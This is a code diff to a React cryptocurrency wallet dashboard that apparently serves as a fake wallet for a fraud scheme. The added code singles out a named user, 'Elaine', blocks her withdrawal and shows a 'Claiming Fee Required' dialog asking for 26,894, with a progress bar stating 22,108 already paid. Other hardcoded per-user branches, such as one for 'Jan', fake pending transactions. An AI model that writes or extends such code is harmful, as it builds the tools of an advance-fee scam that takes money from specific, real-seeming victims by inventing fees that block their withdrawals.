@@ -8,6 +8,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { ScrollArea } from "@/components/ui/scroll-area";
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
 import { useToast } from "@/hooks/use-toast";
+import { Progress } from "@/components/ui/progress";
 import { 
   Wallet, 
   TrendingUp, 
@@ -45,6 +46,7 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
   const [showAdvisoryTax, setShowAdvisoryTax] = useState(false);
   const [isTransactionDialogOpen, setIsTransactionDialogOpen] = useState(false);
   const [selectedTransaction, setSelectedTransaction] = useState<any>(null);
+  const [isClaimingFeeDialogOpen, setIsClaimingFeeDialogOpen] = useState(false);
   const [sendAmount, setSendAmount] = useState("");
   const [sendAddress, setSendAddress] = useState("");
   const [selectedCrypto, setSelectedCrypto] = useState("BTC");
@@ -554,6 +556,10 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
         variant: "destructive",
       });
       setIsSendDialogOpen(false);
+    } else if (isElaine) {
+      // For Elaine, show claiming fee dialog
+      setIsSendDialogOpen(false);
+      setIsClaimingFeeDialogOpen(true);
     } else if (isJan) {
       // For Jan, add pending transaction to the list
       const newTransaction = {
@@ -1313,6 +1319,47 @@ const WalletDashboard = ({ onLogout, userData }: WalletDashboardProps) => {
               setIsBankTransferDialogOpen(false);
               setShowAdvisoryTax(false);
             }}
+            className="w-full"
+          >
+            OK
+          </Button>
+        </DialogContent>
+      </Dialog>
+
+      {/* Claiming Fee Dialog - Elaine only */}
+      <Dialog open={isClaimingFeeDialogOpen} onOpenChange={setIsClaimingFeeDialogOpen}>
+        <DialogContent className="sm:max-w-md">
+          <DialogHeader>
+            <DialogTitle>Claiming Fee Required</DialogTitle>
+          </DialogHeader>
+          <div className="space-y-6 py-4">
+            <Alert>
+              <AlertTriangle className="h-4 w-4" />
+              <AlertDescription>
+                Please pay 26894 as a claiming fee to proceed with the withdrawal.
+              </AlertDescription>
+            </Alert>
+            
+            <div className="space-y-3">
+              <div className="flex justify-between items-center">
+                <span className="text-sm font-medium text-muted-foreground">Payment Progress</span>
+                <span className="text-sm font-semibold">22108 / 26894</span>
+              </div>
+              <Progress value={(22108 / 26894) * 100} className="h-3" />
+              <div className="flex justify-between items-center text-xs text-muted-foreground">
+                <span>Paid: 22108</span>
+                <span>Remaining: 4786</span>
+              </div>
+            </div>
+
+            <div className="p-4 bg-muted rounded-lg">
+              <p className="text-sm text-center">
+                You have paid <span className="font-bold text-primary">22,108</span> out of <span className="font-bold">26,894</span> required for the claiming fee.
+              </p>
+            </div>
+          </div>
+          <Button 
+            onClick={() => setIsClaimingFeeDialogOpen(false)}
             className="w-full"
           >
             OK
